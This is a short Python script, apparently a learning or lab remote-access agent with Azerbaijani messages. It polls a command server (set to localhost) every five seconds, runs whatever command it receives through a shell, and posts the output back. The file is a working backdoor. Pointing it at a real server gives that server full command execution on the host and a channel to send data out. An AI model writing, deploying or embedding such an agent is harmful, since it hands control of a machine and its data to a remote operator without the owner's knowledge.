# agent.py
import time
import requests
import subprocess

SERVER_URL = "http://127.0.0.1:5000"

while True:
    try:
        response = requests.get(f"{SERVER_URL}/get_command").json()
        command = response.get("command")

        if command:
            print(f"[!] Əmr alındı: {command}")
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output

            requests.post(f"{SERVER_URL}/send_result", json={"result": result})
        else:
            print("Əmr yoxdur...")

    except Exception as e:
        print("Xəta:", e)

    time.sleep(5)
